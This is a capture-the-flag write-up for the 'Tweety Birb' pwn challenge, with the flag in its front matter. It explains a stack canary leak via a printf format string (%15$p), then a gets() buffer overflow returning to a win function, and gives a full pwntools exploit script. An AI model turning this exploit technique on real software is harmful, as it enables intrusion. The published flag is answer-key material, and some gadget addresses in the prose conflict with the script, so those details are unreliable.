---
layout: writeup
title: Tweety Birb
ctf: Killer Queen CTF
points: 248
solves: 129
tags: 
    - pwn
date: 2021-11-01
description: |-
    Pretty standard birb protection.
flag: kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}
---
<details>
    <summary>tl;dr</summary>
    
</details>

***

## Introduction

We are given a binary with the following main function
```c
int main(void) {
    char buffer [72];
    long canary = *(long *)(in_FS_OFFSET + 0x28);

    puts("What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it\'s not like you hacker can do anything. Anyways, what do you think of magpies?");
    gets(buffer);
    printf(buffer);

    puts("\nhmmm interesting. What about water fowl?");
    gets(buffer);
    
    if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return 0;
}
```
We have a buffer of size 72. First, we have a call to `gets`, allowing us to write anything, including more than 72 characters, so we have a buffer overflow.

We also have a `win` function elsewhere which calls `cat flag.txt` in a shell, so we want to return to this by overwriting RSP. The problem here (which the title hints at) is that canaries are enabled. This means a random value is set up in the beginning of `main` right after the other local variables. At the end of `main` it checks if this canary has been modified, and if so crashes.

So the second we write more than 72 bytes to the buffer, we modify the canary, which results in a crash. What we want to modify lies after the canary.

The only way to get around this is by somehow leaking the canary. If we can do this, we can write 72 bytes of padding, followed by the canary and then what we want to place in RBP and RSP.

Luckily we ALSO have a format string vulnerability, since `printf(buffer)` is called directly on our input, allowing us to pass any format string. Since no other arguments are passed, if we input e.g. `%x`, the value that it prints will just be the next on the stack.

The canary also lies on the stack and by using `gdb` to debug the program, we can get the correct index in the stack, in this case 15. This means that if we pass `%15$p` to the first `gets()`, then the stack canary is leaked in the `printf()`.

We find the address of the `win` function with `objdump -d tweetybirb | grep win`, which returns `00000000004011d6 <win>:`. Now we can create the following payload:

- 72 bytes of padding
- leaked canary
- rbp (8 random bytes)
- rsp (0x4011d6)

We also need to remember to align the stack when run remotely, so we find a `ret` gadget with `ropper -f tweetybird` at address 0x4011d6 and add this before the `win` address.

We get the flag with the following script:

```python
from pwn import *

p = remote("143.198.184.186", 5002)

# LEAK CANARY IN 
p.recvuntil(b"?\n")
p.sendline(b"%15$p")

canary = p64(int(p.recvline()[2:-1], 16))
log.success(f"Canary leaked: {canary}")

p.recvuntil(b"?\n")

# BUFFER OVERFLOW
padding = b"A" * 72
rbp = b"B" * 8
ret = p64(0x40101a)
win_addr = p64(0x4011d6)

payload = padding + canary + rbp + ret + win_addr
p.sendline(payload)

p.interactive()
```
The flag returned is